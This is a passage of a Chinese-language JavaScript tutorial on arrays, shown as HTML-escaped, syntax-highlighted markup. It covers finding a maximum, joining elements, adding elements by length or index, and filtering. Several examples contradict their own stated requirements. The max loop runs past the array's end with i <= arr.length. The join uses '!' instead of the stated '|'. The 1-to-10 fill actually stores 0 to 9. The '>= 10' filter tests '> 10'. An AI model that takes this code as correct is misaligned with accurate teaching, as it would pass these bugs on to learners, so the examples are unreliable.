    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;average&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// 想要输出多个变量，用逗号分隔即可
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;案例2&#34;&gt;案例2&lt;/h3&gt;
&lt;p&gt;求数组&lt;code&gt;[2, 6, 1, 77, 52, 25, 7]&lt;/code&gt;中的最大值。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;案例分析：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;声明一个保存最大元素的变量max。&lt;/li&gt;
&lt;li&gt;默认最大值可以取数组中的第一个元素。&lt;/li&gt;
&lt;li&gt;遍历这个数组，把里面每个数组元素和max相比较。&lt;/li&gt;
&lt;li&gt;如果这个数组元素大于max就把这个数组元素存到max里面，否则继续下一轮比较。&lt;/li&gt;
&lt;li&gt;最后输出这个max&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 1. 声明一个保存最大元素的变量max。
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 默认最大值可以取数组中的第一个元素。
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 遍历这个数组，把里面每个数组元素和max相比较。
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 4. 如果这个数组元素大于max就把这个数组元素存到max里面，否则继续下一轮比较。
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 5. 最后输出这个max
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;max&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;max&lt;/span&gt;) {
            &lt;span style=&#34;color:#a6e22e&#34;&gt;max&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;];
        }
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;该数组里面的最大值是：&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;max&lt;/span&gt;);
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;案例3数组转换为分割字符串&#34;&gt;案例3：数组转换为分割字符串&lt;/h3&gt;
&lt;p&gt;要求：将数组[&amp;lsquo;red&amp;rsquo;, &amp;lsquo;green&amp;rsquo;, &amp;lsquo;blue&amp;rsquo;, &amp;lsquo;pink&amp;rsquo;] 转换为字符串，并且用|或其他符号分割&lt;/p&gt;
&lt;p&gt;输出：&amp;lsquo;red|green|blue|pink&amp;rsquo;&lt;/p&gt;
&lt;p&gt;案例分析：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;需要一个新变量用于存放转换玩的字符串str&lt;/li&gt;
&lt;li&gt;遍历原来的数组，分别把里面数据取出来，加到字符串里面&lt;/li&gt;
&lt;li&gt;同时在后面多加一个分隔符&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 将数组[&amp;#39;red&amp;#39;, &amp;#39;green&amp;#39;, &amp;#39;blue&amp;#39;, &amp;#39;pink&amp;#39;] 转换为字符串，并且用|或其他符号分割
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 1. 需要一个新变量用于存放转换玩的字符串str
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 遍历原来的数组，分别把里面数据取出来，加到字符串里面
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 同时在后面多加一个分隔
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;red&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;green&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;blue&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pink&amp;#39;&lt;/span&gt;];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sep&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;!&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sep&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt;);
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;85-数组中新增元素&#34;&gt;8.5 数组中新增元素&lt;/h2&gt;
&lt;p&gt;可以通过修改length长度以及索引号增加数组元素&lt;/p&gt;
&lt;h3 id=&#34;851-通过修改-length-长度新增数组元素&#34;&gt;8.5.1 通过修改 length 长度新增数组元素&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;可以通过修改 length 长度来实现数组扩容的目的&lt;/li&gt;
&lt;li&gt;length 属性是可读写的&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-javasc&#34; data-lang=&#34;javasc&#34;&gt;var arr = [&#39;red&#39;, &#39;green&#39;, &#39;blue&#39;];
arr.length = 7;
console.log(arr);
console.log(arr[4]);
console.log(arr[5]);
console.log(arr[6]);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其中索引号是4，5，6的空间没有给值，就是声明变量未给值，默认值就是undefined&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200510192251.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;852-通过修改数组索引新增数组元素&#34;&gt;8.5.2 通过修改数组索引新增数组元素&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;可以通过修改数组索引的方式追加数组元素&lt;/li&gt;
&lt;li&gt;不能直接给数组名赋值，否则会覆盖掉以前的数据&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;red&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;green&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;blue&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pink&amp;#39;&lt;/span&gt;];
&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hotpink&amp;#39;&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这种方式也是我们最常用的一种方式。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 1. 新增数组元素，修改length长度
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;red&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;green&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;blue&amp;#39;&lt;/span&gt;];
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;;		&lt;span style=&#34;color:#75715e&#34;&gt;// 把我们数组的长度修改为了5，里面应该有5个元素
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]);
    
    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 新增数组元素，修改索引号
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;red&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;green&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;blue&amp;#39;&lt;/span&gt;];
    &lt;span style=&#34;color:#a6e22e&#34;&gt;arr1&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pink&amp;#39;&lt;/span&gt;;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr1&lt;/span&gt;);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;arr1&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hotpink&amp;#39;&lt;/span&gt;;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr1&lt;/span&gt;);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;arr1&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;yellow&amp;#39;&lt;/span&gt;;		&lt;span style=&#34;color:#75715e&#34;&gt;// 这里是替换原来的数组元素
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr1&lt;/span&gt;);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;arr1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;有点意思&amp;#39;&lt;/span&gt;;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr1&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// 不要直接给数组名赋值，否则里面的数组元素都没有了
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;853-案例数组新增元素&#34;&gt;8.5.3 案例：数组新增元素&lt;/h3&gt;
&lt;p&gt;新建一个数组，里面存放10个整数（1~10）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;案例分析：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用循环来追加数组&lt;/li&gt;
&lt;li&gt;声明一个空数组arr&lt;/li&gt;
&lt;li&gt;循环中的计数器i可以作为数组元素存入&lt;/li&gt;
&lt;li&gt;由于数组的索引号是从0开始的，因此计数器从0开始更合适，存入的元素要+1&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 新建一个数组，里面存放10个整数（1~10）
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 1. 使用循环来追加数组
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 声明一个空数组arr
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 循环中的计数器i可以作为数组元素存入
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 4. 由于数组的索引号是从0开始的，因此计数器从0开始更合适，存入的元素要+1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        &lt;span style=&#34;color:#75715e&#34;&gt;// arr = i; 	不要直接给数组名赋值，否则以前的元素都没了
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;); 
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;854-案例筛选数组&#34;&gt;8.5.4 案例：筛选数组&lt;/h3&gt;
&lt;p&gt;要求：将数组[2, 0, 6, 1, 77, 0, 52, 0, 25, 7]中大于等于10的元素选出来，放入新数组。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;案例分析：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;声明一个新的数组用于存放新数据newAir&lt;/li&gt;
&lt;li&gt;遍历原来的旧数组，找出大于等于10的元素&lt;/li&gt;
&lt;li&gt;依次追加给新数组newArr&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 要求：将数组[2, 0, 6, 1, 77, 0, 52, 0, 25, 7]中大于等于10的元素选出来，放入新数组。
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 1. 声明一个新的数组用于存放新数据newAir
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 遍历原来的旧数组，找出大于等于10的元素
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 依次追加给新数组newArr
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    
    &lt;span style=&#34;color:#75715e&#34;&gt;// 方法1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;newArr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;) {
            &lt;span style=&#34;color:#75715e&#34;&gt;// 新数组索引号应该从0开始，依次递增
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;newArr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;];
            &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
        }
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;newArr&lt;/span&gt;)
    
    &lt;span style=&#34;color:#75715e&#34;&gt;// 方法2
